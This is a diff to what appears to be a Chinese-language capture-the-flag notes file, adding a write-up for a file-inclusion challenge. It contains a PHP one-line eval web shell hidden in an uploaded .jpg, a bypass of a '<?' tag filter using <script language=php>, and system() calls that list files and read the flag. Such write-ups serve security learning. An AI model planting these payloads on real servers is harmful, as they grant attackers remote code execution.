@@ -732,12 +732,34 @@ sqlmap post 注入
 按套路走,得到 flag
 ## flag.php
 学到了很多
+## 文件包含2  
+右键查看源码发现有个  
+`<!-- upload.php -->`  
+根据提示文件包含所以上传一个jpg，内容为  
+<?php  
+@eval($_POST[pupil]);  
+?>  
+发现上传不成功，`<?`标签被过滤了所以可以使用想到可以用script标签过滤  
+```javascript  
+<script language=php>  
+@eval($_POST[pupil]);  
+</script>  
+```  
+发现ban了菜刀  
+所以直接构造命令执行  
+```javascript  
+<script language=php>system("ls")</script>  
+```  
+和  
+```javascript  
+<script language=php>system("cat flagxxxx.txt")</script>  
+```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNzcwNzczNDAsLTE2MTUwMjczNDAsLTQ4Nz
-gxOTIwNSwxMjIyMzQ2MTgsLTExNDQzMjExMzYsLTY5NjI4MjY0
-OCwtMzg2MjQ2MzQyLDE0NjIwMzg3NDgsLTEwMDI1NzI3NzYsMj
-A2ODQ4ODAxNiw5Njk4MjcyMDcsMTI5NTg5MTA5LDM3MzA0OTMz
-NywtMTQyODczNjc0Nyw0NjA2MTg1MzcsLTcwNDM0MzI5OCwyMD
-Q1MTc3NDM4LC01NjE3OTExNjksLTkzNzUxNjE5OSwtMTE1Nzgy
-NzAwNV19
+eyJoaXN0b3J5IjpbLTIwMzc1Mzk1NzIsNzcwNzczNDAsLTE2MT
+UwMjczNDAsLTQ4NzgxOTIwNSwxMjIyMzQ2MTgsLTExNDQzMjEx
+MzYsLTY5NjI4MjY0OCwtMzg2MjQ2MzQyLDE0NjIwMzg3NDgsLT
+EwMDI1NzI3NzYsMjA2ODQ4ODAxNiw5Njk4MjcyMDcsMTI5NTg5
+MTA5LDM3MzA0OTMzNywtMTQyODczNjc0Nyw0NjA2MTg1MzcsLT
+cwNDM0MzI5OCwyMDQ1MTc3NDM4LC01NjE3OTExNjksLTkzNzUx
+NjE5OV19
 -->
